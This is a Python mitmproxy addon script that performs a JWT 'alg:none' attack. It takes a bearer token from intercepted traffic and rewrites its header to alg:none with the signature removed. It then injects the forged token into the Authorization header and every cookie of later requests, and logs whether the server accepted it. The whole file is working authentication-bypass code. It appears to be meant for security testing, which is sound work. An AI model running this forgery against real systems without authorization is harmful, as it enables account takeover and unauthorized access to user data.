from mitmproxy import http
import base64
import json
from datetime import datetime

RESULT_FILE = "jwt_attack_results_script2.txt"
DYNAMIC_ENDPOINT_FILE = "jwt_endpoints_dynamic.txt"

AUTH_ERROR_KEYWORDS = [
    "unauthorized",
    "forbidden",
    "not authorized",
    "access denied",
    "invalid token"
]

dynamic_endpoints = set()
modified_jwt_token = None
tested = False   # ensure single verdict

# ---------------- helpers ------------------

def b64_decode(data):
    data += "=" * (-len(data) % 4)
    return base64.urlsafe_b64decode(data).decode(errors="ignore")

def b64_encode(data: str):
    return base64.urlsafe_b64encode(data.encode()).decode().rstrip("=")

def forge_alg_none(jwt):
    try:
        h, p, _ = jwt.split(".")
        header = json.loads(b64_decode(h))
        header["alg"] = "none"
        header.pop("kid", None)
        new_h = b64_encode(json.dumps(header, separators=(",", ":")))
        return f"{new_h}.{p}."
    except Exception:
        return None

def extract_jwt_from_flow(flow):
    # Authorization header
    auth = flow.request.headers.get("Authorization", "")
    if auth.lower().startswith("bearer ") and auth.count(".") == 2:
        return auth[7:]

    # Cookies
    for c in flow.request.cookies.values():
        if c.count(".") == 2:
            return c

    return None

# ---------------- logging ------------------

def log_result(flow, result, verdict, confidence):
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    size = len(flow.response.content or b"")

    with open(RESULT_FILE, "a") as f:
        f.write(
            f"[{ts}]\n"
            f"ATTACK: JWT alg:none (signature removed)\n"
            f"METHOD: {flow.request.method}\n"
            f"URL: {flow.request.path}\n"
            f"STATUS: {flow.response.status_code}\n"
            f"RESPONSE_SIZE: {size} bytes\n"
            f"RESULT: {result}\n"
            f"VERDICT: {verdict}\n"
            f"CONFIDENCE: {confidence}\n"
            f"{'-'*60}\n\n"
        )

# ---------------- mitmproxy hooks ------------------

def request(flow: http.HTTPFlow):
    global modified_jwt_token

    # Inject forged JWT everywhere (generic)
    if modified_jwt_token:
        flow.request.headers["Authorization"] = f"Bearer {modified_jwt_token}"
        for k in flow.request.cookies:
            flow.request.cookies[k] = modified_jwt_token
        flow.metadata["jwt_mutated"] = True

    # Dynamic endpoint tracking
    if "Authorization" in flow.request.headers:
        key = f"{flow.request.method} {flow.request.path}"
        if key not in dynamic_endpoints:
            dynamic_endpoints.add(key)
            with open(DYNAMIC_ENDPOINT_FILE, "a") as f:
                f.write(key + "\n")

def response(flow: http.HTTPFlow):
    global modified_jwt_token, tested

    # -------- 1️⃣ Extract JWT once (generic) --------
    if not modified_jwt_token:
        token = extract_jwt_from_flow(flow)
        if token:
            modified_jwt_token = forge_alg_none(token)
        return

    # -------- 2️⃣ Decide (after forged request) --------
    if tested or not flow.metadata.get("jwt_mutated"):
        return
    tested = True

    status = flow.response.status_code
    body = flow.response.get_text(strict=False).lower()
    auth_error = any(e in body for e in AUTH_ERROR_KEYWORDS)

    if 200 <= status < 300 and not auth_error:
        verdict = "VULNERABLE"
        result = "JWT alg:none accepted (signature verification disabled)"
        confidence = "HIGH"
    elif status in (401, 403):
        verdict = "NOT VULNERABLE"
        result = "JWT alg:none rejected by authorization controls"
        confidence = "HIGH"
    else:
        verdict = "NOT VULNERABLE"
        result = "JWT alg:none caused unexpected or blocked behavior"
        confidence = "MEDIUM"

    log_result(flow, result, verdict, confidence)
